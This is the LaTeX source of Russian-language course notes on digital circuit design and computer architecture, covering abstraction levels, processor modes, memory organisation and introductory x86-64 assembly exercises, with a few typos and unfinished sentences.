\input{preamble}

\setmainfont{Times New Roman}

\title{\textbf{\textsc{Цифровая схемотехника и архитектура компьютера}}}
\author{Боднар Олег Леонидович}
\date{} % Для того чтобы не было даты
\linespread{1.3} % Отступ сверху для титульника

\hypersetup{hidelinks} % Чёрные ссылки
% Цветные ссылки
%\hypersetup{
	%colorlinks=true,
	%linkcolor=blue,
	%filecolor=magenta,
	%urlcolor=cyan,
	%citecolor=green,
	%pdfpagemode=FullScreen,
	%}

\pagestyle{fancy} % Устанавливаем стиль страницы
\fancyhf{}
\lhead{\small\hyperref[sec:toc]{\leftmark}} % Тема слева
\rhead{\thepage} % Страница справа
\renewcommand{\headrulewidth}{1pt} % Убрать линию в контитулах

\begin{document}
	
	\maketitle % Титульник
	\thispagestyle{empty} % Отсутствие номера страницы на титульной странице
	\clearpage % Делаем пустой титульник чтобы перенести оглавление
	\setcounter{page}{1} % Сброс счетчика страниц
	\thispagestyle{empty}
	
	\renewcommand{\contentsname}{Содержание} % Изменяем название оглавления
	\tableofcontents\label{sec:toc}
	\clearpage
	
	\section{От нуля до единицы}
	
	\subsection{Искусство управления сложностью}
	
	\par Микропроцессор состоит из миллионов и миллиардов транзисторов. Для того чтобы изготовить удачный микропроцессор и не утонуть при этом в море избыточной информации, необходимо научиться управлять сложностью разрабатываемой системы.
    
    \subsubsection{Абстракция}
    
    \par На рис. 1.1 показаны уровни абстракции, типичные для любой электронной компьютерной системы вместе со строительными блоками, характерными для каждого уровня абстракции этой системы. На самом низком уровне абстракции находится физика, изучающая движение электронов. Поведение электронов описывается квантовой механикой и системой уровней Максвелла.
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=6cm]{img/1.1} 
		\captionsetup{font=footnotesize} 
		\caption*{Рис. 1.1 Уровни абстракции электронной вычислительной системы.} 
	\end{figure}
    
    \par Рассматриваемая нами современная электронная система состоит из полупроводниковых устройств таких как транзисторы. Каждое такое устройство имеет определённые точки соединения с другими подобными устройствами. Эти точки мы будем называть \textit{контактами} (terminal). Любое электронное устройство может быть представлено абстрактной математической моделью, описывающей изменяющуюся во времени взаимозависимость тока и напряжения. Такие же изменения тока и напряжения можно наблюдать на экране осциллографа, если подключить осциллограф к контактам реального устройства. Данный подход означает, что если рассматривать систему на уровне устройств, функции которых однозначно определены, то можно не учитывать поведение электронов внутри отдельных устройств этой системы.
    
    \par Следующий уровень абстракции - это \textit{аналоговые схемы} (analog circuits),  которых полупроводниковые
    устройства соединены таким образом, чтобы они образовывали функциональные компоненты, например усилители. Напряжение на входе и на выходе аналоговой цепи изменяется в непрерывном диапазоне. 
    
    \par В отличие от аналоговых цепей, \textit{цифровые схемы}(digital circuits), такие как логические элементы, используют два строго ограниченных системных уровня напряжения. Один из этих дискретных уровней – это логический ноль, другой – логическая единица. 
    
    \par Микроархитектурный уровень абстракции, или просто \textit{микроархитектура} (microarchitecture), связывает логический и \textit{архитектурный} уровни абстракции. Архитектурный уровень абстракции, или архитектура (architecture), описывает компьютер с точки зрения программиста. Например, архитектура Intel x86, используемая микропроцессорами большинства персональных компьютеров (ПК), определяется набором инструкций и регистров (памяти для временного хранения переменных), доступным для использования программистом. Микроархитектура – это соединение простейших цифровых элементов в логические блоки, предназначенные для выполнения команд, определенных какой-то конкретной архитектурой. Отдельно взятая архитектура может быть реализована с использованием различных вариантов микроархитектур с разным соотношением цены, производительности и потребляемой энергии, и такое соотношение зачастую выбирается как баланс между этими тремя факторами. Процессоры Intel Core i7, Intel 80486 и AMD Athlon, например, используют одну и ту же архитектуру x86, но реализованную с применением трех разных микроархитектурных решений.
    
    \par Рассмотрим область программного обеспечения. \textit{Операционная система} (operating system) управляет операциями нижнего уровня, такими как доступ к жесткому диску или управление памятью. И наконец, программное обеспечение использует ресурсы операционной системы для решения конкретных задач пользователя.
    
    \par Именно принцип \textit{абстрагирования от маловажных деталей} позволяет нам общаться не задумываясь о квантовых колебаниях электронов или организации памяти компьютера.
    
    \subsubsection{Три базовых принципа}
    
    \par Эти принципы применимы как к программному обеспечению, так и к аппаратной части компьютерных систем.
    
    \par \textit{Иерархичность} - принцип иерархичности предполагает разделение системы на отдельные модули, а за тем последующее разделение каждого модуля на фрагменты до уровня, позволяющего легко понять поведение каждого конкретного фрагмента.
    
    \par \textit{Модульность} - принцип модульности требует, чтобы каждый модуль в системе имел чётко определённую функциональность и набор интерфейсов и мог быть легко и без непредвиденных побочных эффектов соединён с другими модулями системы.
    
    \par \textit{Регулярность} - принцип регулярности требует соблюдения единообразия пр разработке отдельных модулей системы. Стандартные модули общего назначения, например такие как блоки питания, могут использоваться многократно, во много раз снижая количество модулей, необходимых для разработке новой системы.
    
    \subsection{Цифровая абстракция}
    
    \par Большинство физических величин изменяются непрерывно. Например, напряжение в электрическом проводе, частота колебаний или распределение массы – все это параметры, изменяющиеся непрерывно. Цифровые системы, с другой стороны, представляют информацию в виде дискретно меняющихся переменных с конечным числом строго определенных значений. 
    
    \par Одной из наиболее ранних цифровых систем стала аналитическая машина Чарльза Бэббиджа, которая использовала переменные с десятью дискретными значениями. Начиная с 1834 года и до 1871 года2 Бэббидж разрабатывал и пытался построить этот механический компьютер. Шестеренки аналитической машины могли находиться в одном из десяти фиксированных положений, а каждое такое положение было промаркировано от 0 до 9, подобно механическому счетчику пробега автомобиля. Рисунок 1.2 показывает, как выглядел прототип аналитической машины. Каждый ряд шестеренок такой машины обрабатывал одну цифру. В своем механическом компьютере Бэббидж использовал 25 рядов шестеренок таким образом, чтобы машина обеспечивала вычисления с точностью до 25-го знака.
    
    \par В отличие от машины Бэббиджа большинство электронных компьютеров использует двоичный (бинарный) код. В случае двоичного кода высокое напряжение – это единица, а низкое напряжение – ноль, поскольку гораздо легче оперировать двумя уровнями напряжения, чем десятью.
    
    \begin{figure}[h]
    	\centering
    	\includegraphics[height=6cm]{img/1.1} 
    	\captionsetup{font=footnotesize} 
    	\caption*{Рис. 1.2 Аналитическая машина Бэббиджа в год его смерти.} 
    \end{figure}
    
    \par Объем информации \(D\), передаваемый одной дискретной переменной, которая может находиться в \(N\) различных состояниях, измеряется в единицах, называемых \textit{битами}, и вычисляется по следующей формуле:
    
    \begin{equation}
    	D = \log_2 N \; \text{bit}
    \end{equation}
    
    \par Двоичная переменная передаёт \(\log_2 2 = 1\) - один бит информации. Теперь понятно почему единица информации - бит. Бит (bit) – это сокращение от английского binary digit, что дословно переводится как двоичный разряд. Каждая шестеренка в машине Бэббиджа содержит \(\log_2 10 = 3.322\) , бита информации, поскольку она может находиться в одном из \(2^{3.322} = 10\)
	
	\section{Архитектуры процессорных систем}
	
	\subsection{Процессор}
	
	\par \textit{Процессор} - это программно-управляемое устройство, выполненное на одной интегральной схеме, выполняющее обработку информации и управление этим процессором. (микросхема, которой можно управлять программно)
	
	\par Если подходить абсолютно строго к терминологии, то микропроцессором называется такой процессор, все элементы которого размещаются на одной микросхеме. До 70-х годов ХХ века полупроводниковая технология не позволяла разместить процессор целиком на одной микросхеме, поэтому процессоры мощных компьютеров представляли собой набор плат с довольно большим количеством различных микросхем на них. Компания Intel в 1971 году представила первый 4-битный микропроцессор, получивший в качестве названия номер 4004. В наши дни даже самые передовые суперкомпьютеры построены на микропроцессорах, поэтому в этой книге мы будем считать «микропроцессор» и «процессор» тождественными понятиями и использовать оба этих  термина как синонимы.
	
	\par Принципы фон Неймана, на них строиться работа современного компьютера
	\\1) Двоичное кодирование
	\\2) Адресуемость памяти 
	\\3) Последовательность программного управления
	\\4) Однородность памяти(не всегда выполняется например Гарвардская архитектура, она как раз обычно применяется на уровне ядра). Однородность - это когда нет разделения между инструкциями и данными.
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=7cm]{img/3.5} 
		\captionsetup{font=footnotesize} 
		\caption*{Машина с хранимой в памяти программой} 
	\end{figure}
	
	\par Процессор видит мир через призму памяти, всё что делает процессор это работа с памятью.
	\par \textit{Разрядность} - это величина, которая определяет размер машинного слова.
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=2.5cm]{img/2.4} 
		\captionsetup{font=footnotesize} 
		\caption*{} 
	\end{figure}
	
	\par Процессор имеет режимы работы:
	\\
	1) Реальных адресов (16 бит) - режим в который процессор переходит сразу после включения компьютера. Он так называется потому что адрес сформированный программами является реальным и не требует дополнительных преобразований.
	\\
	2) Защищённый режим (32 бит) - режим в который можно перейти только после режима реальных адресов. Защищённый означает что обеспечивает защиту данных операционной системы от прикладных программ и данных этих программ друг от друга благодаря разделению этих приложений на разные уровни привилегий. После того как операционная система получает управление, она переводит процессор в защищённый режим, выставляя специальный флаг системного регистра, устанавливает разрешение и условие для других программ, определяет таблицы дескрипторов и прерываний, таким образом операционная система получает полный доступ к компьютеру. 
	\\
	3) 64-разрядный режим + режим совместимости (long mod)
	
	\par Уровни привилегий - доступ к использованию ресурсов процессора. В режиме реальных адресов привилегий нету, потому что в нём может одновременно выполняться только одна программа, поэтому данный защищать не от кого. В остальных режимах существует 4 уровня привилегий от 0 до 3-х.
	\\
	1) 0-ой уровень (привилегированный) - на этом уровне обеспечивается полный доступ к процессору и именно на нём работает операционная система.
	\\
	2) 1-ый уровень (менее привилегированный) - запреты установленные на 0-ом уровне будут действовать на 1-ый уровень.
    \\
	3) 2-ой уровень (ещё меньше привилегированный) - запреты установленные на 1-ом и 0-ом уровне будут действовать на 2-ом
	\\
	4) 3-ий уровень (пользовательский) - он имеет самый низкий приоритет и подчиняется всем вышестоящим уровням. На нём работают все прикладные программы и они не могут обращаться к данным которые были определены на других уровнях. 
	
	\par На практике в операционных системах 1-ый и 2-ой уровни используются редко. Таким образом программы и данные ограничены внутри своих уровней привилегий где доступы ко многим командам, регистрам управления, участкам памяти и т.д. строго заблокированы.
	
	\par Устройство адресации. Вся оперативная память поделена на условные сегменты. \textit{Сегменты} - отдельные участки памяти определённого размера и их размер зависит от режима процессора в котором он работает. Адрес конкретной ячейки памяти который выставляют программы представляется в специальном формате. 
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=8cm]{img/2.6} 
		\captionsetup{font=footnotesize} 
		\caption*{} 
	\end{figure}
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=8cm]{img/2.7} 
		\captionsetup{font=footnotesize} 
		\caption*{} 
	\end{figure}
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=8cm]{img/2.8} 
		\captionsetup{font=footnotesize} 
		\caption*{} 
	\end{figure}
	
	\par Обобщим рисунки выше. В ходе выполнения программы ей нужно обращаться к участкам памяти чтобы получать оттуда данные, записывать их, вызывать другие процедуры и т.д. Для этого она формирует логические адреса памяти по которым должно произойти это обращение. В зависимости от режима работы процессора этот логический адрес либо сразу преобразуется в физический, либо преобразуется в виртуальный после чего виртуальный преобразуется в физический, после этого выставляется на шину адреса и происходит обращение. 
	
	\par Каким образом внешним  
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=6cm]{img/2.9} 
		\captionsetup{font=footnotesize} 
		\caption*{} 
	\end{figure}
	
	\subsection{Основные понятия}
	
	\par Любая компьютерная система состоит из трёх частей: центральный процессор, системная память и внешние устройства. Все три компонента взаимодействуют
	друг с другом посредством шин\footnote{Компьютерная шина в архитектуре компьютера — соединение, служащее для передачи данных между функциональными блоками компьютера. В устройстве шины можно различить механический, электрический (физический) и логический (управляющий) уровни. 
	\\Системная шина - основная шина, соединяющая процессор и оперативную память, а также важнейшие контроллеры.
	\\Шина данных - используется для передачи данных между компонентами. Она определяет, сколько бит информации может быть передано одновременно (например, 8, 16, 32 или 64 бита).
	\\Адресная шина - передает адреса памяти, указывая, где находятся данные или команды, которые процессор хочет прочитать или записать.
	\\Управляющая шина - используется для передачи управляющих сигналов, которые координируют работу различных компонентов системы.
	}; наиболее важная из них – системная шина: именно с её помощью процессор взаимодействует с системной памятью и с важнейшими контроллерами. Здесь нам понадобится ввести четвёртое понятие – \textit{контроллер}. Контроллер может выполнять разные действия: быть посредником между процессором и внешними устройствами (контроллер ввода-вывода, контроллер прерываний, USB-контроллер и т.д.) либо выполнять некоторые специфичные операции (например, контроллер прямого доступа к памяти).
	
	\par Основная задача процессора – это выполнение инструкций, которые
	находятся в памяти. Всё время после включения компьютера и до самого выключения процессор выполняет инструкции – за исключением некоторых случаев,когда он переходит в «подвешенное» состояние для экономии энергии. В зависимости от режима, в котором находится процессор, инструкции он выполняет по разному.
	
	\par \textit{Инструкция} или \textit{машинная команда} это просто некоторый код, фактически обычное число, которое находится в памяти и обозначает некоторое действие. Инструкции бывают разные и разного размера – они могут занимать от одного до нескольких байт. По сути, они дают указание процессору, что ему надо делать. Для того чтобы процессор «знал», откуда из памяти брать команды для выполнения, он использует специальный указатель инструкции. Выполнив очередную инструкцию, процессор обновляет этот указатель, так чтобы он указывал на следующую команду в памяти. Если какая-либо инструкция не может быть выполнена, процессор генерирует исключение; если исключение не может быть обработано, то он перезагружается.
	
	\par На рис. 1.3 приведена наиболее упрощённая схема устройства процессорной
	системы.
	
	\par Линии, которыми соединяются блоки, – это шины: шина адреса, шина данных
	и шина управления. Все они объединяются в одну системную шину. Для расширения возможностей системы на системную шину «цепляются» контроллеры. Каждый контроллер исполняет команды, которые были посланы ему через системную шину.
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=10cm]{img/1.3} 
		\captionsetup{font=footnotesize} 
		\caption*{Рис. 1.3 Упрощённая схема устройства компьютера.} 
	\end{figure}
	
	\par Самая главная составляющая любой системы – это \textit{память} (системная память). Память бывает двух видов: физическая и линейная.
	
	\par Процессор тоже имеет свою память двух видов: кэш-память и регистровую. Дефакто \textit{кэш-память} – это такая же системная память, просто находящаяся внутри кристалла процессора. Кэш-память является копией некоторой области основной памяти, к которой он часто обращается.
	
	\par Регистровую память представляют собой регистры. Регистр – это такое устройство, которое хранит в себе некоторую информацию, т. е. некоторое значение. Разрядность значения определяет разрядность регистра. Одни регистры могут хранить только определённую информацию, другие – любую. Те регистры, которые могут хранить любую информацию, называются регистрами общего назначения. Остальные регистры напрямую управляют работой процессора; точнее сказать, сами они не управляют, а процессор работает по-разному в зависимости от значений, которые принимают эти регистры. Регистры бывают разной разрядности, но большинство регистров 8-, 16-, 32- и 64-разрядные. 
	
	\begin{figure}[h]
		\centering
		\begin{minipage}{0.45\textwidth}
			\centering
			\includegraphics[height=4cm]{img/1.6} 
			\captionsetup{font=footnotesize} 
			\caption*{} 
		\end{minipage}
		\hfill
		\begin{minipage}{0.55\textwidth}
			\centering
			\includegraphics[height=4cm]{img/2.5} 
			\captionsetup{font=footnotesize} 
			\caption*{} 
		\end{minipage}
	\end{figure}
	
	\par Для того чтобы получить значение, которое находится по определённому
	адресу памяти, процессор выставляет на шину адреса физический адрес, после чего на шине данных появляется значение. Конечно, появляется не мгновенно, но очень быстро – это зависит от скорости работы системной шины, памяти и других параметров. Если на шину адреса выведется значение памяти по адресу примерно большее 512 Мб, а на машине реально установлено 256 Мб, то в зависимости от материнской платы и памяти на шину данных может выйти просто «ерунда» или нулевое значение. Точно так же устанавливается и значение ячейки памяти. Вы спросите: «Как же материнская плата “узнает”, что собирается сделать процессор?». На шину управления выставляется определённое значение, которое указывает материнской плате (или модулю памяти), что процессор хочет писать в память или читать из неё.
	
	\par Обращения к определённым адресам памяти (которых обычно реально нет в системной памяти) могут перехватываться некоторыми контролерами и перенаправляться к устройствам. Перехватив обращение к памяти, контроллер перенаправляет данные, которые должны быть помещены в память (или считаны из памяти) некоторому устройству. Таким образом, программа может взаимодействовать с внешними устройствами посредством записи/чтения из определённых адресов памяти. Это основной метод взаимодействия программ и устройств.
	
	\par Адрес, который выставляется на шину адреса, - это и есть физический адрес. виртуальной памятью всё будет сложнее. Виртуальная память может и не существовать реально, т. е. она «вроде бы есть, но её как бы нет». Если приложение операционной системы обращается к несуществующему адресу, процессор транслирует его в существующий адрес, а если памяти не хватает, то другая занятая память выгружается на внешнюю память (HDD, Flash и т.д.). 
	
	\par Как же происходит выполнение программ на процессоре? Все данные, которыми может оперировать процессор, находятся в памяти и только в памяти; если данные находятся не в памяти, а на внешних устройствах, то необходимо сначала загрузить эти данные в память и только потом с ними работать. Программа, дефакто, – это тоже данные, просто они представляют собой коды инструкций. Код инструкции называют \textit{опкодом}. 
	
	\par \textit{Опкод} – это несколько байтов данных (от 1 до 10 и более), закодированных специальным образом, чтобы процессор мог понять, что от него «хотят». Иначе говоря, опкоды инструкций – это приказы процессору, которые тот беспрекословно выполняет, например: переслать данные из одного регистра в другой, из регистра в память, выполнить вычитание или сложение и т. д.
	
	\par Процессор использует специальный регистр в качестве указателя инструкции EIP (IP, RIP). Этот регистр всегда содержит адрес следующей инструкции. После выполнения очередной инструкции процессор читает инструкцию из адреса, на который указывает регистр EIP, определяет её размер и обновляет адрес в регистре EIP (прибавляет к значению в регистре EIP размер текущей инструкции). После выборки инструкции из памяти и изменения регистра EIP процессор приступает к её выполнению. Инструкция может выполняться от одного до нескольких десятков процессорных тактов. В процессе выполнения инструкции может измениться адрес в регистре EIP. При изменении адреса в регистре EIP следующей будет выполнена именно та инструкция, адрес которой содержит регистр EIP – иными словами, произойдёт переход, или прыжок. После выполнения инструкции процессор читает следующую инструкцию, которая находится по адресу, содержащемуся в регистре EIP, и процесс повторяется. 
	
	\par Ещё одно важное понятие – это \textit{стек}. Стек – это специальная область памяти, которая используется для хранения промежуточных данных. Представьте, что одна подпрограмма вызывает другую; вызываемая подпрограмма завершила свое выполнение, и теперь ей надо передать управление подпрограмме, которая её вызвала. Адрес команды, к которой надо вернуться после выполнения вызванной подпрограммы, находится на верхушке стека.
	
	\par Стек – как магазин автомата: добавили адрес, добавили второй, добавили третий, и затем адреса достают в порядке, обратном добавлению: третий, второй, первый. Следовательно, подпрограмма может вызвать ещё одну подпрограмму, а та, в свою очередь, – ещё одну, и так сколько угодно – всё ограничивается только размером стека. На верхушку стека указывает определённый регистр.
	
	\subsection{Оперативная память}
	\par \textit{Оперативная память} -именно та память в которой находятся программы которые выполняются в данный момент времени.
	
	\par Абстрактная модель оперативной памяти представляет собой набор ячеек. Бит это минимальная информация которая может храниться в такой ячейке. Эти ячейки битов образуются в группы по 8 бит, образуя байты. Процессор не может обращаться к какому-то конкретному биту, обращения могут происходить только к какому-то определённому байту в памяти. Байт - минимальная ячейка адресации.
	
	\begin{figure}[h]
		\centering
		\begin{minipage}{0.45\textwidth}
			\centering
			\includegraphics[height=4cm]{img/1.7} 
			\captionsetup{font=footnotesize} 
			\caption*{} 
		\end{minipage}
		\hfill
		\begin{minipage}{0.45\textwidth}
			\centering
			\includegraphics[height=4cm]{img/1.8} 
			\captionsetup{font=footnotesize} 
			\caption*{} 
		\end{minipage}
	\end{figure}
	
	\par Из-за того что каждый байт имеет отдельный адрес такой вид адресации называется \textit{байтовый}. Но существуют компьютеры у которых размер одной ячейки памяти может равняться машинному слову, это максимальное количество бит которыми может оперировать процессор за раз. То есть в 32-ух разрядных процессорах размер регистров и размер машинного слова будет равен 32 бита, у 62-х разрядных системах 64 бита и т.д. Но в основном используют байтовую адресацию, а другие нужны уже для работы с большими числами как правило в научных исследованиях. Из-за того что процессор будет обращаться не к байту а к слову, то такая адресация будет называться словесной.
	
	\par Почему именно 8 бит в 1 байте ? 
	\\
	1) Многие из первых компьютерных компаний базировались в США, где самым распространённым языком является английский. Минимальный размер, в который впишутся любые английские символы и знаки пунктуации, составляет 7 бит. Число 8 лучше 7, потому что является степенью 2.
	\\
	2) Компьютеры в основном работают с текстом, поэтому полный охват в 256 символов был сочтён достаточным для подавляющего большинства возможных применений.
	\\
	3) В рамках этого охвата один символ представляется одним байтом, чтобы длина любой отдельной записи не зависела от совпадения символов в этой записи.
	\\ 
	4) 8-битные байты обеспечивают разумную экономию пространства хранилища.
	\\
	5) При работе с числами десятичную цифру можно представить всего 4 битами, и два таких 4-битных байта можно упаковать в один 8-битный. И хотя подобное упаковывание численных данных не представляет особой значимости, это распространённая практика, позволяющая увеличить скорость и эффективность хранилища. Строго говоря, 4-битные байты относятся к другому коду, но простота 4- и 8-битной схемы в сравнении, например, с комбинацией 4 и 6 бит ведёт к более простому устройству машины и логики адресации.

	
	\par Почему такие размеры памяти 2048 = 2гб, 4096 = 4гб, 8192 = 8гб? 
	\\
	1) Размер оперативной памяти должен быть кратен размеру ячеек, то есть 8 битам
	\\
	2) Адреса по которым процессор обращается к памяти представляют собой числа, эти адреса задаются в регистрах. Максимальное количество значений которое может хранить в себе регистор равняется \(2^{register size}\). То есть регистр на 8 бит = \(2^8\) = 256, на 10 бит = \(2^{10}\) = 1024 и т.д.
	
	\begin{figure}[h]
		\centering
		\begin{minipage}{0.45\textwidth}
			\centering
			\includegraphics[height=4cm]{img/2.0} 
			\captionsetup{font=footnotesize} 
			\caption*{Пример двух способов хранения 1240 в памяти} 
		\end{minipage}
		\hfill
		\begin{minipage}{0.45\textwidth}
			\centering
			\includegraphics[height=5cm]{img/2.1} 
			\captionsetup{font=footnotesize} 
			\caption*{Выравнивание в памяти процессора} 
		\end{minipage}
	\end{figure}
	
	\par Выравнивание данных по естественным границам
	\\
	Процессор считывает машинные слова из памяти себе в регистор и если они в памяти будут располагаться по хаотичным адресам, то в таком случае не все модели процессоров смогут обращаться к таким данным, либо обращение к ним займёт большое количество времени поэтому чтобы память работала максимально эффективно слова должны быть выравнены по их естественным границам 

	\par Как хранятся числовые типы данных 
	
	\begin{figure}[h]
		\centering
		\begin{minipage}{0.25\textwidth}
			\centering
			\includegraphics[height=4cm]{img/2.2} 
			\captionsetup{font=footnotesize} 
			\caption*{} 
		\end{minipage}
		\hfill
		\begin{minipage}{0.65\textwidth}
			\centering
			\includegraphics[height=4cm]{img/2.3} 
			\captionsetup{font=footnotesize} 
			\caption*{} 
		\end{minipage}
	\end{figure}
    
	\section{Основы ассемблера}
	
    \subsection{Инструкция копирования MOV}
	
	\texttt{movq <scr> <dst>} Первый аргумент <scr> источник, второй <dst> куда копируем значение.
	\\
	RAX :Регистры общего назначения, часто 
	используется для возврата значений из функций и арифметических операций.
	\\RBX (Base Register):Обычный регистр, который обычно используется для хранения базовых адресов. Он сохраняет значение, которое можно использовать как основу для сложных адресов.
	\\RCX (Count Register):Также используется в циклах и для количества операций, например, в командах LOOP, где его значение уменьшается после каждой итерации.
	\\RDX (Data Register):Используется для хранения дополнительных данных или результатов операций. Например, в делении и
	ли умножении может хранить дополнительное значение.
	\\RBP (Base Pointer):Используется как указатель на базу текущего стека. Позволяет легко обращаться к локальным переменным и параметрам функции.
	\\RDI (Destination Index):Обычно используется для указания адреса (пункта назначения) в операциях, например, при копировании строк или массивов.
	\\RSI (Source Index): Используется как указатель на источник данных для операций, подобных MOVS, LODS, SCAS.
	
	\texttt{movq \%RAX, \%RBX} Копирует 64-битное значение из регистра RAX в регистр RBX. Для обращения к регистрам используют %
	
	\texttt{movq (\%RAX), \%RAX} операция разыменования берёт значение в регистре 64битное число \texttt{\%RAX} () интерпретируем его как адрес, обращаемся по этому адресу в память и достаём 8 байтовое значение и это значение записываем в регистр RAX После выполнения RAX будет содержать значение, находящееся по адресу, на который указывал RAX до выполнения этой инструкции.
	
	\texttt{movq \$42, \%RAX} - копирует константу 42 непосредственно в регистр RAX. \$ указывает, что 42 константа. После выполнения
	, RAX будет равен 42. Не требует доступа к памяти, просто загружает константу в регистр.
	
    \texttt{movq \$42, \%RAX} - здесь 42 без \$ интерпретируется как адрес в памяти, а не как константа. Это означает, что команда
	попытается получить 64-битное значение из памяти по адресу 42 и поместить его в RAX. После выполнения RAX будет содержать значение, расположенное по адресу 42 в памяти. Это может привести к ошибке, если по этому адресу нет допустимого значения.
	
	\par value: Это имя, которое может использоваться для обозначения переменной, метки или константы в коде. В контексте ассемблера под value может скрываться как фиксированное числовое значение, так и адрес памяти, где хранится данные.
	\\
	\texttt{movq \$value, \%RAX}
 	\\
 	\texttt{movq value, \%RAX}

	
    \textbf{Задание}
	\par Напишите код, который обменивает значения в регистрах RSI и RDX. Т. е. если перед выполнением вашего кода в регистре RSI хранится число 1, а в регистре RDX хранится число 2, то после выполнения кода в регистре RSI должно храниться число 2, а в регистре RDX число 1. Вам разрешено пользоваться следующими регистрами общего назначения: RAX, RBX, R
	CX, RDX, RBP, RDI, RSI, R8 - R15
	\\В задании не предполагается использование стека, даже если вы знаете, что это такое.
	
	\textbf{Решение:}
	\texttt {movq \%RSI, \%RBX} ;Копирует содержимое регистра RSI в регистр RBX. Теперь RBX будет содержать то же значение, что и R
	SI, а сам RSI останется неизменным.
    \texttt{movq \%RDX, \%RSI} ;Теперь RSI будет содержать значение из RDX. Значение RDX не изменяется.
	\texttt{movq \%RBX, \%RDX} ;Теперь RDX будет содержать значение, которое ранее было в RSI (так как оно было скопировано в RBX
	в первой команде).
	
	Операция: movq — это команда, которая копирует 64-битное (q обозначает quadword) значение из одного регистра в другой. 
	\\q в ассемблере используется в movq, addq и других команд с "q" означает, что вы работаете с 64-битными(8-байтными) значениями. Это важно для правильного управления памятью и данными.
	\\
	\\Что такое Quadword?
	\par Quadword состоит из четырех "word" (слов), где каждое слово обычно представляет 16 бит (или 2 байта) в архитектуре
	x86. Таким образом, quadword = 4 × 16 бит = 64 бита.
	\\Quadword позволяет представлять большие числа, объемные данные или адреса в 64-битной системе, что делает его идеальным для современных процессоров и операционных систем, которые работают с 64-битной адресацией.
	
	\subsection{Простые арифметические инструкции}
	\texttt {addq <scr>, <dst>} сложение
	Соответственно складывает значения регистров <scr> и <dst> и их сумма сохраняется во втором аргументе
	
	\texttt {addq \%RAX, \%RBX}  Сначала значение RAX извлекается. Затем это значение прибавляется к текущему значению RBX. Результат помещается в RBX, а RAX остается неизменным.
	
	\texttt {addq \%RAX, value} Сначала значение RAX извлекается.Затем это значение прибавляется к значению по адресу value в памяти (например, это может быть переменная в программе).Результат записывается обратно по адресу value.
	
	\texttt {addq \$42, \%RAX} разу берется константа 42 и она прибавляется к текущему значению RAX. Результат записывается обратно в RAX.
	
	\texttt {sub <scr>, <dst>} вычитание
	Вычитает первый аргумент из второго
	
    \texttt {incq <op>} увеличение на единицу
	Пример: incq \%RAX
	
	\texttt {decq <op>} уменьшение на единицу
	
	\par \textbf{Задание}
	Сложите два числа в регистрах RSI и RDX, результат должен быть в регистре RSI.Вам разрешено пользоваться следующими регистрами общего назначения:RAX, RBX, RCX, RDX, RBP, RDI, RSI, R8 - R15.
	\\В задании не предполагается использование стека, даже если вы знает
	е, что это такое.
	
	\par \textbf{Решение}
	\\
	\texttt{addq \%RDX, \%RSI}
	
	
	Инструкция без знакового умножения и деления
	\\
	\texttt{mulq <op>}: - Умножение
	
    \par В качестве второго аргумента всегда используется RAX, то есть берёт RAX и умножает на переданный аргумент. Младшие биты в RAX а старшие в RDX.
	\\
	\texttt{divq <op>} - Деление
	
	\par Работает также как и умножение. Вычисляет остаток и частное от деления. Остаток от деления попадает в RDX, частное от деления попадает в RAX
	
	\subsection{Стек}
	
	\par Локальные переменные функции сохраняются на стек. Стек - область памяти на которую нам указывает регистор RSP. Чтобы положить значения на стек используется инструкция.
	
	
	\par \texttt{pushq <src>} - уменьшает RSP на 8 и сохраняет по полученному адресу src. Суффикс q говорит, что мы хотим изменит на 8. Как вы видим на рис. 1.4 RSP до инструкции pushq указывает на вершину стека, затем после инструкции значение стека уменьшается на 8.
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=6cm]{img/1.4} 
		\captionsetup{font=footnotesize} 
		\caption*{Рис. 1.4. Инструкция работы со стеком pushq} 
	\end{figure}
	
	\par Например 
	\\
	\texttt{pushq \$42} - сохраняет 8 байтное число 42 на стеке.
	\\
	\texttt{pushq \%RAX} - на стек скопируется значение RAX 
	
	\par Обратное действие инструкции \texttt{pushq <src>} выполняет 
	\\
	\texttt{popq <dst>} - удаляет значения со стека и сохраняет туда куда мы ему скажем 
	\par Например 
	\\
	\texttt{popq \%RAX} - удаляет 8-байтное значение со стека и сохраняет его в RAX
	\\
	Если мы хотим прочитать значение со стека но не удалять 
	\\
	\texttt{movq(\%RSP), \%RAX} - мы обращаемся по адресу RSP читаем 8-байтное значение и сохраняем его регистр RAX 
	\\
	Пример работы \texttt{popq \%RAX}
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=6cm]{img/1.5} 
		\captionsetup{font=footnotesize} 
		\caption*{Рис. 1.5. Инструкция работы со стеком popq} 
	\end{figure}
	
	\par В контексте ассемблера, стек - это подход к использованию виртуальной памяти. Инструкции pop\_ и  push\_  можно выразить с помощью других инструкций, но просто в ассмблер они введены для удобства, и более того, могут иметь технически иную реализацию, которую продумали инженеры, проектировавшие процессор. Стек и куча, в контексте ассемблера, - подходы к использованию виртуальной памяти, не путайте их с абстрактными структурами данных.
	
	\par \textbf{Задание}
	
	\par В регистрах RSI и RDX вам даны два числа, ваша задача поменять их местами, как и в одном из предыдущих заданий. Но добавляется условие, что все остальные регистры общего назначения должны остаться неизменными. Т. е. если вы используете какой-то регистр общего назначения кроме RSI и RDX, то вы должны сохранить и затем восстановить сохраненное значение регистра (ну или не пользоваться этими регистрами вовсе).
	
	\par Вам разрешено пользоваться следующими регистрами общего назначения: RAX, RBX, RCX, RDX, RBP, RDI, RSI, R8 - R15.
	
	\par В задании предполагается использование стека, но вы должны восстановить стек в исходное состояние.
	
	\par \textbf{Решение}
    \\
	\texttt{pushq \%RSI} ; 
	Что делает: Эта команда помещает текущее значение регистра RSI на стек. В x86-64 стек работает по принципу LIFO (последний пришел - первый вышел). Как это работает: Стек уменьшается на размер сохраненного элемента (в данном случае, на 8 байт, так как регистры 64-битные). Значение RSI теперь доступно на верхушке стека. Как это работает: Стек уменьшается на размер сохраненного элемента (в данном случае, на 8 байт, так как регистры 64-битные). Значение RSI теперь доступно на верхушке стека.
	
 
